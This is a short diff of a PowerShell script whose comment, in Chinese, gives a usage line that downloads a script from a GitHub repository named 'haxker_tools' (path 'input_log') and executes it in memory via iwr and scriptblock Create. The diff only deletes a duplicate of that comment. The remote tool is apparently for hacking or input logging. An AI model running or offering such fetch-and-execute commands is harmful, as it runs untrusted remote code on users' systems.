@@ -1,9 +1,6 @@
 # 請使用以下方法進行參數傳送
 # & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
 
-# 請使用以下方法進行參數傳送
-# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
-
 param(
     [Parameter(Mandatory=$true)]
     [int]$time
